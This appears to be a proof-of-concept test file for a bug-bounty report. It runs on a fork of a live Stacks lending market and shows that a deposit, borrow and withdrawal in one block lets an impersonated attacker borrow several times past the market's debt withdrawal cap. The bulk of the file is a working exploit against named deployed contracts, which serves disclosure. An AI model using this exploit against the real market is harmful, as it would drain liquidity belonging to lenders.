// Immunefi 97264 - same-block LP liquidity inflates the debt withdrawal cap.
//
// Runs against the live USDCx market contracts and on-chain state, forked at a pinned
// block height. No contract is modified: the defect is exercised on the deployed code.
//
// Fork: Clarinet remote_data, initial_height 9411000 (2026-11-04).
// Anchor state-v1: SP3M2BYF7RGF8WKW5FVDNJ6WR8D7AR9BHDXAKPXZE
// Live market:     SPSX722NK9V3A8D3CVQT0CDY4EBQ3E9FSDDE61FT

import { describe, expect, it } from "vitest";
import { tx } from "@stacks/clarinet-sdk";
import { Cl } from "@stacks/transactions";
import { buildEvmUpdate, buildLazerPayload, PROP, TEST_PUBKEY } from "../tests/lazer";

const ANCHOR = "SP3M2BYF7RGF8WKW5FVDNJ6WR8D7AR9BHDXAKPXZE";
const MARKET = "SPSX722NK9V3A8D3CVQT0CDY4EBQ3E9FSDDE61FT";
const ORACLE = "SPMV5HDZ4EMB8XY7HAYT3XW0DF7DZ4E8XEG2J1T8";
const USDCX = "SP120SBRBQJ00MCWS7TM5R8WJNTTKD5K0HFRC2CNE.usdcx";
const SBTC = "SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token";
const SBTC_ADDR = "SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4";

// Impersonated principals. Every call below is a simnet call with one of these as sender;
// no key or mnemonic is involved.
const ATTACKER = "SP2J6ZY48GV1EZ5V2V5RB9MP66SW86PYKKNRV9EJ7";

const DEBT_CAP_FACTOR = 20_000_000n; // live get-debt-cap-factor
const REFILL_WINDOW = 36_000n; // live get-refill-time-window
const SCALING = 100_000_000n;

// Collateral: 200 sBTC at the price below is $20M, well past every LTV check here.
const COLLATERAL = 20_000_000_000n; // 200 sBTC (8 decimals)
const SBTC_PRICE = 10_000_000_000_000n; // $100,000 at 8 decimals
const USDCX_PRICE = 100_000_000n; // $1.00 at 8 decimals

// Temporary liquidity: just under USDCx live total supply (8,721,256,115,754), which is the
// most a mainnet attacker could marshal without minting.
const TEMP_LIQUIDITY = 8_700_000_000_000n;

const read = (contract: string, fn: string, args: any[] = []) =>
  simnet.callReadOnlyFn(contract, fn, args, ANCHOR).result;

const readUint = (contract: string, fn: string, args: any[] = []): bigint =>
  (read(contract, fn, args) as any).value as bigint;

// SIP-010 getters wrap their uint in (ok ...)
const readUintOk = (contract: string, fn: string, args: any[] = []): bigint =>
  ((read(contract, fn, args) as any).value as any).value as bigint;

const ok = (r: any) => expect(r.result).toBeOk(Cl.bool(true));

const borrowable = () => readUint(`${ANCHOR}.state-v1`, "get-borrowable-balance");
const debtBucket = () => readUint(`${MARKET}.withdrawal-caps-v1`, "get-debt-bucket");
const debtCapFactor = () => readUint(`${MARKET}.withdrawal-caps-v1`, "get-debt-cap-factor");
const refillWindow = () => readUint(`${MARKET}.withdrawal-caps-v1`, "get-refill-time-window");
const usdcxSupply = () => readUintOk(USDCX, "get-total-supply");

const capOf = (balance: bigint): bigint => (balance * DEBT_CAP_FACTOR) / SCALING;

function priceUpdate(): Uint8Array {
  const now = simnet.getBlockTime();
  return buildEvmUpdate(
    buildLazerPayload({
      timestamp: now * 1_000_000n,
      channel: 1,
      feeds: [
        { id: 7, props: [[PROP.Price, USDCX_PRICE], [PROP.Exponent, -8n], [PROP.PublisherCount, 1n], [PROP.Confidence, 1n]] },
        { id: 1, props: [[PROP.Price, SBTC_PRICE], [PROP.Exponent, -8n], [PROP.PublisherCount, 1n], [PROP.Confidence, 1n]] },
      ],
    })
  );
}

const borrow = (amount: bigint) =>
  simnet.callPublicFn(`${MARKET}.borrower-v1`, "borrow", [Cl.buffer(priceUpdate()), Cl.uint(amount), Cl.none()], ATTACKER);

// USDCx has 6 decimals.
const format = (v: bigint) => `${v} (${(Number(v) / 1e6).toFixed(6)} USDCx)`;

// The oracle's trusted signer is the live production key, which this harness does not hold.
// Rotate it to a known test key through the oracle's own governance entry point, impersonating
// the principal that holds ROLE_GOVERNANCE in the forked state. This changes no contract code.
function connectOracle() {
  expect(read(`${ORACLE}.pyth-lazer-oracle`, "has-role", [Cl.principal(ORACLE), Cl.buffer(Uint8Array.from([0]))]))
    .toEqual(Cl.bool(true));
  ok(simnet.callPublicFn(
    `${ORACLE}.pyth-lazer-oracle`,
    "set-trusted-signers",
    [Cl.list([Cl.tuple({ pubkey: Cl.buffer(TEST_PUBKEY), "expires-at": Cl.uint(100_000_000_000n) })])],
    ORACLE
  ));
}

function fundAttacker(collateral: bigint) {
  simnet.executeCommand(`::mint_ft ${SBTC}.sbtc-token ${ATTACKER} ${collateral}`);
  ok(simnet.callPublicFn(
    `${MARKET}.borrower-v1`,
    "add-collateral",
    [Cl.contractPrincipal(SBTC_ADDR, "sbtc-token"), Cl.uint(collateral), Cl.none()],
    ATTACKER
  ));
}

// Borrow the whole live bucket, then let a full refill window elapse. This is the state in
// which the report's Variant A assumes the bucket: drained, with the window elapsed.
function drainAndWait(): { balanceAfterDrain: bigint; drained: bigint } {
  const cap0 = capOf(borrowable());
  ok(borrow(cap0));
  const balanceAfterDrain = borrowable();
  const start = simnet.getBlockTime();
  let guard = 0;
  while (simnet.getBlockTime() - start < REFILL_WINDOW) {
    simnet.mineEmptyBlocks(10);
    if (++guard > 100) throw new Error("refill window not reached");
  }
  return { balanceAfterDrain, drained: cap0 };
}

describe("Immunefi 97264 - LP deposit inflates the debt withdrawal cap", () => {
  it("fork reports the live market constants", () => {
    const supply = usdcxSupply();
    console.log("FORK", {
      block: simnet.blockHeight,
      blockTime: simnet.getBlockTime().toString(),
      borrowable: format(borrowable()),
      debtBucket: format(debtBucket()),
      debtCapFactor: debtCapFactor().toString(),
      refillWindow: refillWindow().toString(),
      usdcxSupply: format(supply),
    });
    expect(debtCapFactor()).toBe(DEBT_CAP_FACTOR);
    expect(refillWindow()).toBe(REFILL_WINDOW);
    expect(supply).toBeGreaterThan(TEMP_LIQUIDITY);
  });

  it("control: a borrow above 20% of live borrowable is refused", () => {
    connectOracle();
    fundAttacker(COLLATERAL);
    const cap = capOf(borrowable());
    const r = borrow(cap + 1n);
    console.log("CONTROL cap+1", { cap: format(cap), result: JSON.stringify(r.result) });
    expect(r.result).toBeErr(Cl.uint(120003));
  });

  it("control: after drain + refill window, the ceiling is again exactly 20% of borrowable", () => {
    connectOracle();
    fundAttacker(COLLATERAL);
    const { balanceAfterDrain, drained } = drainAndWait();
    const cap1 = capOf(balanceAfterDrain);
    const r = borrow(cap1 + 1n);
    console.log("CONTROL drained+waited", {
      drained: format(drained),
      balanceAfterDrain: format(balanceAfterDrain),
      cap: format(cap1),
      result: JSON.stringify(r.result),
    });
    expect(r.result).toBeErr(Cl.uint(120003));
  });

  it("control: after drain + refill window, borrowing exactly the 20% cap succeeds", () => {
    connectOracle();
    fundAttacker(COLLATERAL);
    const { balanceAfterDrain } = drainAndWait();
    const cap1 = capOf(balanceAfterDrain);
    const r = borrow(cap1);
    console.log("CONTROL cap exactly", { cap: format(cap1), result: JSON.stringify(r.result) });
    ok(r);
  });

  it("variant A: deposit + borrow + withdraw in one block borrows far past the control cap", () => {
    connectOracle();
    fundAttacker(COLLATERAL);
    const { balanceAfterDrain } = drainAndWait();
    const cap1 = capOf(balanceAfterDrain);

    simnet.executeCommand(`::mint_ft ${USDCX}.usdcx-token ${ATTACKER} ${TEMP_LIQUIDITY}`);
    // The deposit happens before the borrow in the same block, so the borrow's cap sync reads
    // a borrowable balance that already includes the temporary liquidity.
    const inflatedCap = capOf(balanceAfterDrain + TEMP_LIQUIDITY);
    const block = simnet.mineBlock([
      tx.callPublicFn(`${MARKET}.liquidity-provider-v1`, "deposit", [Cl.uint(TEMP_LIQUIDITY), Cl.principal(ATTACKER)], ATTACKER),
      tx.callPublicFn(`${MARKET}.borrower-v1`, "borrow", [Cl.buffer(priceUpdate()), Cl.uint(inflatedCap), Cl.none()], ATTACKER),
      // Withdraw slightly less than the deposit: deposit mints floor(assets*S/A) shares and
      // withdraw burns ceil(assets*S/A), so an exact round trip can burn one share more than it
      // minted. The temporary liquidity is still recovered for the attack's purposes.
      tx.callPublicFn(`${MARKET}.liquidity-provider-v1`, "withdraw", [Cl.uint(TEMP_LIQUIDITY - 1000n), Cl.principal(ATTACKER)], ATTACKER),
    ]);
    const [depositRes, borrowRes, withdrawRes] = block;
    console.log("VARIANT A", {
      controlCap: format(cap1),
      temporaryLiquidity: format(TEMP_LIQUIDITY),
      borrowed: format(inflatedCap),
      multipleOfControlCap: Number(inflatedCap) / Number(cap1),
      deposit: JSON.stringify(depositRes.result),
      borrow: JSON.stringify(borrowRes.result),
      withdraw: JSON.stringify(withdrawRes.result),
      borrowableAfter: format(borrowable()),
      debtBucketAfter: format(debtBucket()),
      attackerUsdcxAfter: format(readUintOk(USDCX, "get-balance", [Cl.principal(ATTACKER)])),
    });
    ok(depositRes);
    ok(borrowRes);
    ok(withdrawRes);
    expect(inflatedCap).toBeGreaterThan(cap1 * 3n);
  });

  it("control: without the deposit, the next block cannot borrow past the ceiling", () => {
    connectOracle();
    fundAttacker(COLLATERAL);
    const { balanceAfterDrain } = drainAndWait();
    const cap1 = capOf(balanceAfterDrain);
    ok(borrow(1n));
    simnet.mineEmptyBlock();
    const r = borrow(cap1 * 2n);
    console.log("VARIANT B CONTROL", {
      cap: format(cap1),
      attempt: format(cap1 * 2n),
      bucket: format(debtBucket()),
      result: JSON.stringify(r.result),
    });
    expect(r.result).toBeErr(Cl.uint(120003));
  });

  it("variant B: the inflated credit survives the LP withdrawal and is spent next block", () => {
    connectOracle();
    fundAttacker(COLLATERAL);
    const { balanceAfterDrain } = drainAndWait();
    const cap1 = capOf(balanceAfterDrain);

    simnet.executeCommand(`::mint_ft ${USDCX}.usdcx-token ${ATTACKER} ${TEMP_LIQUIDITY}`);
    const block = simnet.mineBlock([
      tx.callPublicFn(`${MARKET}.liquidity-provider-v1`, "deposit", [Cl.uint(TEMP_LIQUIDITY), Cl.principal(ATTACKER)], ATTACKER),
      tx.callPublicFn(`${MARKET}.borrower-v1`, "borrow", [Cl.buffer(priceUpdate()), Cl.uint(1n), Cl.none()], ATTACKER),
      tx.callPublicFn(`${MARKET}.liquidity-provider-v1`, "withdraw", [Cl.uint(TEMP_LIQUIDITY - 1000n), Cl.principal(ATTACKER)], ATTACKER),
    ]);
    block.forEach(ok);
    const bucketAfterExit = debtBucket();
    const balanceAfterExit = borrowable();

    simnet.mineEmptyBlock();
    const attempt = cap1 * 2n;
    const r = borrow(attempt);
    console.log("VARIANT B", {
      controlCap: format(cap1),
      bucketAfterExit: format(bucketAfterExit),
      balanceAfterExit: format(balanceAfterExit),
      attempt: format(attempt),
      result: JSON.stringify(r.result),
      bucketAfterBorrow: format(debtBucket()),
    });
    ok(r);
    expect(bucketAfterExit).toBeGreaterThan(cap1 * 3n);
    expect(attempt).toBeGreaterThan(cap1);
  });
});
